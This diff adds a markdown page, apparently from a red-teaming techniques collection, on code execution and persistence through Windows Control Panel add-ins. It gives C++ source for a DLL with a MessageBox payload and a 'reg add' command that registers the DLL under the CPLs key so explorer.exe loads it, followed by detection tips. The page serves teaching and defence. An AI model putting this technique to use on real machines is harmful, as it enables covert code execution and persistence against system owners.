@@ -1,0 +1,111 @@
+---
+parsed_by: focuslocust
+source: redteamingtactics
+type: generated
+---
+# Code Execution through Control Panel Add-ins
+
+[Home](../../../README.md)
+
+## Provenance
+
+| Field | Value |
+| --- | --- |
+| Source | `redteamingtactics` |
+| Type | `redteaming-topic` |
+| Record ID | `rtt-offensive-security-code-execution-code-execution-through-control-panel-add-ins` |
+| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/code-execution/code-execution-through-control-panel-add-ins.md` |
+| Parsed by | `focuslocust` |
+| Relationship mode | `explicit / conservative inferred / manual` |
+
+## Summary
+
+It's possible to force explorer.exe to load your DLL that is compiled as a Control Panel Item and is registered as a Control Panel Add-in.
+
+## Preserved Body
+
+````markdown
+It's possible to force explorer.exe to load your DLL that is compiled as a Control Panel Item and is registered as a Control Panel Add-in.
+This technique could also be considered for persistence.
+## Execution
+
+Let's compile our control panel item (which is a simple DLL with an exported function `Cplapplet`) from the below code:
+
+```cpp
+#include <Windows.h>
+#include "pch.h"
+
+//Cplapplet
+extern "C" __declspec(dllexport) LONG Cplapplet(
+    HWND hwndCpl,
+    UINT msg,
+    LPARAM lParam1,
+    LPARAM lParam2
+)
+{
+    MessageBoxA(NULL, "Hey there, I am now your control panel item you know.", "Control Panel", 0);
+    return 1;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+    DWORD  ul_reason_for_call,
+    LPVOID lpReserved
+)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    {
+        Cplapplet(NULL, NULL, NULL, NULL);
+    }
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+```
+
+Let's now register our control panel item as an add-in (defenders beware of these registry modifications):
+
+```
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs" /v spotless /d "C:\labs\cplAddin\cplAddin\x64\Release\cplAddin2.dll" /f
+```
+
+![](<../../_assets/image (573).png>)
+
+Now, whenever the Control Panel is opened, our DLL will be injected into explorer.exe and our code will execute:
+
+![](<../../_assets/control-panel-item-addin.gif>)
+
+Below shows that our DLL is injected into explorer.exe:
+
+![](<../../_assets/image (574).png>)
+
+## Detection
+
+* Look for modifications in the following registry key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\CPLs`
+* Look for / prevent DLLs from loading from unsecure locations
+
+## References
+
+[https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET\_InvisiMole.pdf](https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET\_InvisiMole.pdf)
+````
+
+## Source Verification
+
+[source record](../../sources/redteamingtactics/code-execution-through-control-panel-add-ins.md)
+
+## Evidence Excerpt
+
+````text
+_asset_filenames:
+- control-panel-item-addin.gif
+- image (573).png
+- image (574).png
+_body: "# Code Execution through Control Panel Add-ins\n\nIt's possible to force explorer.exe to load your DLL that is compiled\
+\ as a Control Panel Item and is registered as a Control Panel Add-in.\n\n{% hint style=\"info\" %}\nThis technique could\
+\ also be considered for persistence.\n{% endhint %}\n\n## Execution\n\nLet's compile our control panel item (which is a\
+\ simple DLL with an exported function `Cplapplet`) from the below code:\n\n```cpp\n#include <Windows.h>\n#include \"pch.h\"\
+````
